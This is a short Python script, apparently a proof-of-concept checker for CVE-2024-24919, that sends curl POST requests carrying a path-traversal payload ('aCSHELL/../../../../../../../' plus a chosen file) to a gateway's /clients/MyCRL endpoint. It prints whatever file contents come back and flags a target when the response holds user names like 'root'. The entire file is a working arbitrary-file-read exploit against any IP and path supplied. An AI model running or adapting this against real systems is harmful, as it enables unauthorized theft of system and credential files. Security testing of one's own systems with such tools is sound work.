#!/usr/bin/python3

import subprocess
import argparse

# ANSI escape codes for coloring
BLUE = '\033[94m'
ORANGE = '\033[93m'
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

def check_vulnerability(ip, port, file_name):
    """
    Checks if a server is vulnerable to directory traversal attacks using curl commands.
    
    Args:
    - ip (str): The IP address of the server.
    - port (str): The port number the server is running on.
    - file_name (str): The file path to attempt to access.

    Returns:
    - tuple: A tuple containing the vulnerability status ("vulnerable" or "not-vulnerable") and the server response text if vulnerable.
    """
    
    # Define the curl commands to execute
    commands = [
        # Disable SSL verification
        f"curl -i -s -k -X POST \
           -H 'Host: {ip}' \
           -H 'Content-Length: 39' \
           --data-binary 'aCSHELL/../../../../../../../{file_name}' \
           'https://{ip}:{port}/clients/MyCRL'",

        # Specify SSL version (TLSv1.2)
        f"curl -i -s -k -X POST \
           -H 'Host: {ip}' \
           -H 'Content-Length: 39' \
           --data-binary 'aCSHELL/../../../../../../../{file_name}' \
           --tlsv1.2 \
           'https://{ip}:{port}/clients/MyCRL'"
    ]

    # Execute each command
    for command in commands:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            print(result.stdout)
            # Check if the server response contains typical system users
            if any(word in result.stdout for word in ["root", "admin", "nobody"]):
                print(f"{ip}:{port} is vulnerable.")
                return "vulnerable", result.stdout

        except subprocess.CalledProcessError as e:
            print(f"Command execution failed for {ip}:{port}: {str(e)}")

    print(f"{ip}:{port} is not vulnerable.")
    return "not-vulnerable", None

def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(description='Check for CVE-2024-24919 vulnerability using curl.')
    parser.add_argument('--ip', required=True, help='IP address of the target')
    parser.add_argument('--port', required=True, help='Port of the target')
    parser.add_argument('--path', required=True, help='File path to attempt to access on the target')
    
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    file_path = args.path

    # Check for vulnerability
    result, output = check_vulnerability(ip, port, file_path)


if __name__ == "__main__":
    main()
